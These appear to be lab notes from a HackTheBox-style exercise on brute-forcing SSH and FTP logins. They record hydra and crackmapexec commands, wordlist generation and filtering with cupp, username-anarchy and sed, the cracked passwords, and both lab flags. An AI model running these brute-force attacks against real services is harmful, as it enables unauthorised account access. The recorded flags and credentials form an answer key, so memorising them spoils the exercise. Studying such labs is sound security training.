# Service Authentication Brute Forcing

## SSH Attack

hydra -L bill.txt -P william.txt -u -f ssh://$TARGET:22 -t 4

ssh b.gates@$TARGET -p 22

## FTP Brute Forcing

netstat -antp | grep -i list

(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -   

hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

ftp 127.0.0.1

## LAB

cupp -i

sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers

git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Bill Gates > bill.txt

hydra -l b.gates -P william.txt -u -f ssh://94.237.63.93:52536 -t 4
crackmapexec ssh 94.237.63.93:52536 -u b.gates -p william.txt

crackmapexec ssh 94.237.63.93 -u b.gates -p william.txt --port 52536

crackmapexec ssh 94.237.55.163 -u b.gates -p william.txt --port 45286

SSH         94.237.55.163   45286  94.237.55.163    [+] b.gates:4dn1l3M!$ 


ssh b.gates:4dn1l3M22@94.237.63.93 -p 45286
4dn1l3M!$ 

cat flag.txt 
HTB{n3v3r_u53_c0mm0n_p455w0rd5!}


ls /home
b.gates m.gates

hydra -l m.gates -P rockyou-10.txt -u -f ftp://127.0.0.1

[21][ftp] host: 127.0.0.1   login: m.gates   password: computer
1 of 1 target successfully completed, 1 valid password found

ssh m.gates@94.237.63.93 -p 45286
computer

cat flag.txt
HTB{1_4m_@_bru73_f0rc1n6_m4573r}